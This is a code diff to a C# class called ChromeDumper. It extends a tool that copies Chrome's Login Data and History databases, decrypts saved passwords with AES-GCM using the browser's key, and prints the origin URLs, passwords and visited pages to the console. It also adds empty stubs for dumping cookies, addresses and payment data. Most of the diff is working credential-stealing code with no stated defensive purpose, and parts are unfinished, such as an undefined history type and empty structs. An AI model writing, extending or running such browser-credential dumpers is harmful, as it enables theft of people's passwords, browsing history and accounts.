@@ -32,22 +32,27 @@ namespace ChromeDumper
             get { return _m_szLocalState; }
             set { _m_szLocalState = value; }
         }
+        private string _m_szHistory { get; set; }
+        public string m_szHistory
+        {
+            get { return _m_szHistory; }
+            set { _m_szHistory = value; }
+        }
 
         private string m_szConnStringLoginData { get { return $"Data Source={m_szLoginDataPath};Version=3;"; } }
+        public string m_szConnStringHistory { get { return $"DataSource={m_szHistory};Version=3;New=False;Compress=True;"; } }
 
         public clsDumper(string szChromeDirectory)
         {
             m_szChromeDirectory = szChromeDirectory;
-            _m_szLoginDataPath = $"{m_szChromeDirectory}\\User Data\\Default\\Login Data";
-            _m_szLocalState = $"{m_szChromeDirectory}\\User Data\\Local State";
+            fnInit();
         }
         public clsDumper()
         {
             string szAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
 
             m_szChromeDirectory = $"{szAppData}\\Google\\Chrome";
-            _m_szLoginDataPath = $"{m_szChromeDirectory}\\User Data\\Default\\Login Data";
-            _m_szLocalState = $"{m_szChromeDirectory}\\User Data\\Local State";
+            fnInit();
         }
 
         public struct stCredential
@@ -66,7 +71,24 @@ namespace ChromeDumper
         }
         public struct stCookie
         {
+            public string URL { get; set; }
+            public string Name { get; set; }
+            public string Value { get; set; }
+        }
+        public struct stAddress
+        {
 
+        }
+        public struct stPayment
+        {
+            
+        }
+
+        private void fnInit()
+        {
+            _m_szLoginDataPath = $"{m_szChromeDirectory}\\User Data\\Default\\Login Data";
+            _m_szLocalState = $"{m_szChromeDirectory}\\User Data\\Local State";
+            _m_szHistory = $"{m_szChromeDirectory}\\User Data\\Default\\History";
         }
 
         private bool fnbIsV10(byte[] abData) => Encoding.UTF8.GetString(abData.Take(3).ToArray()) == "v10";
@@ -111,8 +133,28 @@ namespace ChromeDumper
             }
         }
 
+        string Decrypt(byte[] pass, byte[] key)
+        {
+            byte[] iv = new byte[12]; // initialize a new 12-byte IV
+            Array.Copy(pass, 3, iv, 0, 12); // copy the IV from the password byte array
+
+            byte[] ciphertext = new byte[pass.Length - 31];
+            Array.Copy(pass, 15, ciphertext, 0, pass.Length - 31);
+
+            byte[] tag = new byte[16];// initialize a new 16-byte authentication tag
+            Array.Copy(pass, pass.Length - 16, tag, 0, 16); // copy the authentication tag from the end of the password byte array
+
+            using AesGcm aesGcm = new AesGcm(key);
+            byte[] decryptedData = new byte[ciphertext.Length]; // initialize a new byte array for the decrypted data
+            aesGcm.Decrypt(iv, ciphertext, tag, decryptedData); // decrypt the ciphertext using the key, IV, and authentication tag
+
+            return Encoding.UTF8.GetString(decryptedData);
+        }
+
         public List<stCredential> fnDumpPassword()
         {
+            fnInit();
+
             List<stCredential> lc = new List<stCredential>();
             string szTempFile = Path.GetTempFileName();
             File.Delete(szTempFile);
@@ -130,16 +172,13 @@ namespace ChromeDumper
                 byte[] abCipherPassword = (byte[])dr["password_value"];
                 long lDate1 = long.Parse(dr["date_created"].ToString());
                 long lDate2 = long.Parse(dr["date_last_used"].ToString());
-                DateTime dtEpochStart = new DateTime(1601, 1, 1);
-                long lDelta1 = long.Parse(DateTime.Now.ToString()) - lDate1;
-                long lDelta2 = long.Parse(DateTime.Now.ToString()) - lDate2;
-                long lCreationDate = long.Parse(dtEpochStart.ToString()) + lDelta1;
-                long lLastLoginDate = long.Parse(dtEpochStart.ToString()) + lDelta2;
+                DateTime dtEpochStart = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);
 
-                DateTime dtCreationDate = new DateTime(1970, 1, 1, 0, 0, 0, 0);
-                DateTime dtLastLoginDate = new DateTime(1970, 1, 1, 0, 0, 0, 0);
-                dtCreationDate = dtCreationDate.AddSeconds(lCreationDate);
-                dtLastLoginDate = dtLastLoginDate.AddSeconds(lLastLoginDate);
+                DateTime dtCreationDate = dtEpochStart.AddTicks(lDate1);
+                DateTime dtLastLoginDate = dtEpochStart.AddTicks(lDate2);
+
+                long lCreationDate = (dtCreationDate - dtEpochStart).Ticks;
+                long lLastLoginDate = (dtLastLoginDate - dtEpochStart).Ticks;
 
                 if (fnbIsV10(abCipherPassword))
                 {
@@ -152,8 +191,10 @@ namespace ChromeDumper
                 else
                 {
                     string szPassword = string.Empty;
-                    try { szPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(abCipherPassword, null, DataProtectionScope.CurrentUser)); }
+                    try { szPassword = Decrypt(abCipherPassword, abKey); }
                     catch (Exception ex) { szPassword = $"[DECRYPT FAILED://{ex.Message}]"; }
+                    Console.WriteLine(dr["origin_url"]);
+                    Console.WriteLine(Convert.ToBase64String(abCipherPassword));
                     Console.WriteLine(szPassword);
                 }
 
@@ -170,6 +211,39 @@ namespace ChromeDumper
             }
 
             File.Delete(szTempFile);
+
+            return lc;
+        }
+        public List<stHistory> fnDumpHistory()
+        {
+            fnInit();
+
+            List<stHistory> lh = new List<stHistory>();
+            string szTempFile = Path.GetTempFileName();
+            File.Delete(szTempFile);
+            File.Copy(m_szHistory, szTempFile);
+            m_szHistory = szTempFile;
+
+            DataTable dt = fndtQuery("SELECT * FROM urls order by last_visit_time desc", m_szConnStringHistory);
+
+            foreach (DataRow dr in dt.Rows)
+            {
+                lh.Add(new stHistory()
+                {
+                    URL = (string)dr["url"],
+                    Title = (string)dr["title"],
+                });
+                Console.WriteLine(dr["last_visit_time"]);
+            }
+
+            File.Delete(szTempFile);
+
+            return lh;
+        }
+        public List<stCookie> fnDumpCookie()
+        {
+            List<stCookie> lc = new List<stCookie>();
+
 
             return lc;
         }
